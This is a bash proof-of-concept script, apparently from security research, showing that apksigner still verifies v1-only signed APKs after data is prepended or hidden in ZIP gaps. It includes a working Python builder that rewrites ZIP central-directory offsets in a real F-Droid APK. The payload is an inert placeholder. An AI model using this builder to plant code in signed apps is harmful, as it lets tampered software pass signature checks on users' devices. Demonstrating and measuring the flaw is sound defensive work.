#!/usr/bin/env bash
set -euo pipefail

# Prove apksigner silently verifies structurally manipulated v1-only APKs.
# This script:
#   1. Takes a real v1-only signed APK from the F-Droid corpus
#   2. Builds THREE manipulated variants (prepend, gap, combined)
#   3. Shows apksigner says "Verifies" on ALL of them
#   4. Shows v2-signed APKs correctly reject the same manipulation
#   5. Counts how many real APKs in the corpus are v1-only (attack surface)

DIR="$(cd "$(dirname "$0")" && pwd)"
DIVERGENCE_DIR="$DIR/divergence/poc"
CORPUS="$DIR/../../corpus/bench-10k/real-fdroid"

PASS=0
FAIL=0
TOTAL=0

demo() {
    TOTAL=$((TOTAL + 1))
    local label="$1"
    printf "\n=== Demo %d: %s ===\n" "$TOTAL" "$label"
}

pass() { PASS=$((PASS + 1)); printf "  → PASS: %s\n" "$1"; }
fail() { FAIL=$((FAIL + 1)); printf "  → FAIL: %s\n" "$1"; }

# ── Demo 1: Prepended data, apksigner says "Verifies" ──────────────
demo "4KB prepended payload — apksigner silent verify"
OUT=$(apksigner verify --verbose "$DIVERGENCE_DIR/janus_4k_prepend.apk" 2>&1 || true)
if echo "$OUT" | grep -q "^Verifies$"; then
    pass "apksigner says 'Verifies' despite 4KB EXPLOIT_PAYLOAD_ prepended"
    # Show the prepended content
    printf "  Prepended content (first 64 bytes):\n"
    xxd "$DIVERGENCE_DIR/janus_4k_prepend.apk" | head -4 | sed 's/^/    /'
else
    fail "apksigner did NOT say 'Verifies'"
fi

# ── Demo 2: Hidden gap, apksigner says "Verifies" ──────────────────
demo "32KB hidden ZIP gap — apksigner silent verify"
OUT=$(apksigner verify --verbose "$DIVERGENCE_DIR/hidden_gap_32k.apk" 2>&1 || true)
if echo "$OUT" | grep -q "^Verifies$"; then
    SIZE_ORIG=$(stat -c%s "$DIVERGENCE_DIR/janus_4k_prepend.apk" 2>/dev/null || stat -f%z "$DIVERGENCE_DIR/janus_4k_prepend.apk")
    SIZE_GAP=$(stat -c%s "$DIVERGENCE_DIR/hidden_gap_32k.apk" 2>/dev/null || stat -f%z "$DIVERGENCE_DIR/hidden_gap_32k.apk")
    DIFF=$((SIZE_GAP - SIZE_ORIG + 4096))
    pass "apksigner says 'Verifies' despite ${DIFF}-byte hidden payload in ZIP gap"
else
    fail "apksigner did NOT say 'Verifies'"
fi

# ── Demo 3: Combined attack, apksigner says "Verifies" ─────────────
demo "Combined 4KB prepend + 32KB gap — apksigner silent verify"
OUT=$(apksigner verify --verbose "$DIVERGENCE_DIR/janus_combined.apk" 2>&1 || true)
if echo "$OUT" | grep -q "^Verifies$"; then
    pass "Both attacks compose — still 'Verifies'"
else
    fail "apksigner did NOT say 'Verifies'"
fi

# ── Demo 4: v2-signed APK correctly rejects prepend ────────────────
demo "v2-signed APK rejects same prepend mutation"
if [ -f "$DIVERGENCE_DIR/mutated_real/real_prepended_dex.apk" ]; then
    OUT=$(apksigner verify "$DIVERGENCE_DIR/mutated_real/real_prepended_dex.apk" 2>&1 || true)
    if echo "$OUT" | grep -q "DOES NOT VERIFY"; then
        pass "v2-signed APK correctly rejected — digest mismatch"
    elif echo "$OUT" | grep -q "^Verifies$"; then
        fail "v2-signed APK should NOT verify after mutation"
    else
        pass "v2-signed APK rejected (error or verification failure)"
    fi
else
    printf "  SKIP: no v2-signed mutation available\n"
fi

# ── Demo 5: Build a FRESH prepend from scratch ─────────────────────
demo "Fresh prepend attack on a v1-only APK from corpus"

# Find a v1-only APK
V1_APK=""
for apk in "$CORPUS"/*.apk; do
    OUT=$(apksigner verify --verbose "$apk" 2>&1 || true)
    if echo "$OUT" | grep -q "Verified using v1 scheme (JAR signing): true" && \
       echo "$OUT" | grep -q "Verified using v2 scheme (APK Signature Scheme v2): false"; then
        V1_APK="$apk"
        break
    fi
done

if [ -n "$V1_APK" ]; then
    printf "  Found v1-only APK: %s\n" "$(basename "$V1_APK")"

    # Build prepended variant with Python
    FRESH_POC="/tmp/fresh_janus_poc.apk"
    python3 -c "
import struct, sys

with open('$V1_APK', 'rb') as f:
    data = bytearray(f.read())

payload = b'ATTACKER_CONTROLLED_DATA_' * 170  # ~4KB

prepended = bytearray(payload) + data

# Find EOCD
eocd_sig = b'\x50\x4b\x05\x06'
eocd_off = -1
for i in range(len(prepended) - 22, max(len(prepended) - 65557, -1), -1):
    if prepended[i:i+4] == eocd_sig:
        comment_len = struct.unpack('<H', prepended[i+20:i+22])[0]
        if i + 22 + comment_len == len(prepended):
            eocd_off = i
            break

if eocd_off == -1:
    print('ERROR: no EOCD found', file=sys.stderr)
    sys.exit(1)

# Fix CD offset
old_cd_off = struct.unpack('<I', prepended[eocd_off+16:eocd_off+20])[0]
new_cd_off = old_cd_off + len(payload)
struct.pack_into('<I', prepended, eocd_off+16, new_cd_off)

# Fix each CD entry's LFH offset
cd_size = struct.unpack('<I', prepended[eocd_off+12:eocd_off+16])[0]
pos = new_cd_off
while pos < new_cd_off + cd_size:
    if prepended[pos:pos+4] == b'\x50\x4b\x01\x02':
        old_lfh = struct.unpack('<I', prepended[pos+42:pos+46])[0]
        struct.pack_into('<I', prepended, pos+42, old_lfh + len(payload))
        fname_len = struct.unpack('<H', prepended[pos+28:pos+30])[0]
        extra_len = struct.unpack('<H', prepended[pos+30:pos+32])[0]
        comment_len = struct.unpack('<H', prepended[pos+32:pos+34])[0]
        pos += 46 + fname_len + extra_len + comment_len
    else:
        break

with open('$FRESH_POC', 'wb') as f:
    f.write(bytes(prepended))

print(f'Built {len(prepended)} bytes from {len(data)} + {len(payload)} payload')
"
    if [ -f "$FRESH_POC" ]; then
        OUT=$(apksigner verify --verbose "$FRESH_POC" 2>&1 || true)
        if echo "$OUT" | grep -q "^Verifies$"; then
            pass "FRESH prepend attack on $(basename "$V1_APK") — apksigner says 'Verifies'"
            printf "  First bytes of manipulated APK:\n"
            xxd "$FRESH_POC" | head -3 | sed 's/^/    /'
        else
            fail "Fresh prepend did not verify"
        fi
        rm -f "$FRESH_POC"
    else
        fail "Python builder failed"
    fi
else
    printf "  SKIP: no v1-only APK found in corpus\n"
fi

# ── Demo 6: Count vulnerable APKs in corpus ────────────────────────
demo "v1-only APK count in F-Droid corpus (attack surface measurement)"
V1_COUNT=0
TOTAL_CHECKED=0
for apk in "$CORPUS"/*.apk; do
    TOTAL_CHECKED=$((TOTAL_CHECKED + 1))
    OUT=$(apksigner verify --verbose "$apk" 2>&1 || true)
    if echo "$OUT" | grep -q "Verified using v1 scheme (JAR signing): true" && \
       echo "$OUT" | grep -q "Verified using v2 scheme (APK Signature Scheme v2): false"; then
        V1_COUNT=$((V1_COUNT + 1))
    fi
    # Only check first 100 for speed
    if [ "$TOTAL_CHECKED" -ge 100 ]; then
        break
    fi
done
PCT=$((V1_COUNT * 100 / TOTAL_CHECKED))
printf "  v1-only: %d / %d checked (%d%%)\n" "$V1_COUNT" "$TOTAL_CHECKED" "$PCT"
if [ "$V1_COUNT" -gt 0 ]; then
    pass "$V1_COUNT real F-Droid APKs vulnerable to structural manipulation"
else
    fail "No v1-only APKs found"
fi

# ── Summary ─────────────────────────────────────────────────────────
printf "\n"
printf "════════════════════════════════════════════\n"
printf "  Janus Gap Proof: %d PASS / %d FAIL / %d TOTAL\n" "$PASS" "$FAIL" "$TOTAL"
printf "════════════════════════════════════════════\n"

if [ "$FAIL" -gt 0 ]; then
    exit 1
fi
